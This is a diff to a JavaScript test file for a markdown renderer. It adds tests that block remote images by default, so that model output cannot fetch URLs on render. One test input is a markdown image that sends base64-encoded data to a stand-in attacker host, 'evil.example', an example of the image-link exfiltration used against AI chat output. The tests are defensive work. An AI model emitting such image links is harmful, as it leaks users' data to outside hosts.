@@ -140,9 +140,31 @@ test('renderMarkdownHtml nests deeper levels and returns to shallower ones', () 
 
 // ---- images, strikethrough, underscore emphasis ------------------------------
 
-test('renderMarkdownHtml renders images (relative + http) with escaped alt and lazy loading', () => {
+test('renderMarkdownHtml renders images (relative + http) with escaped alt and lazy loading in a document', () => {
   assert.match(renderMarkdownHtml('![logo](/img/x.png)'), /<img src="\/img\/x\.png" alt="logo" loading="lazy">/);
-  assert.match(renderMarkdownHtml('![a](https://ex.com/y.png)'), /<img src="https:\/\/ex\.com\/y\.png" alt="a" loading="lazy">/);
+  assert.match(renderMarkdownHtml('![a](https://ex.com/y.png)', { remoteImages: true }), /<img src="https:\/\/ex\.com\/y\.png" alt="a" loading="lazy">/);
+});
+
+test('by default a remote image never becomes an <img>: model output cannot fetch a URL on render', () => {
+  const html = renderMarkdownHtml('Summary. ![status](https://evil.example/p.png?d=c2VjcmV0) done');
+  assert.doesNotMatch(html, /<img/);
+  assert.doesNotMatch(html, /src=/);
+  assert.match(html, /<span class="md-image-blocked" title="Remote image not loaded">\[image: status — evil\.example, not loaded\]<\/span>/);
+  const quoted = renderMarkdownHtml('![a "b" <c>](http://h.example/x.png)');
+  assert.match(quoted, /\[image: a &quot;b&quot; &lt;c&gt; — h\.example, not loaded\]/);
+});
+
+test('remote-image permission lasts for one render only', () => {
+  assert.match(renderMarkdownHtml('![a](https://ex.com/y.png)', { remoteImages: true }), /<img/);
+  assert.doesNotMatch(renderMarkdownHtml('![a](https://ex.com/y.png)'), /<img/);
+});
+
+test('only the document editor preview opts in to remote images', async () => {
+  const { readFile } = await import('node:fs/promises');
+  const source = await readFile(new URL('../../public/js/main.js', import.meta.url), 'utf8');
+  const optedIn = source.split('\n').filter((line) => line.includes('remoteImages: true'));
+  assert.equal(optedIn.length, 3, optedIn.join('\n'));
+  for (const line of optedIn) assert.match(line, /previewHtml: renderMarkdownHtml\(text,|updateDocumentLivePreview\(appRoot,/);
 });
 
 test('renderMarkdownHtml does not create an image for a javascript: (or other) unsafe src', () => {
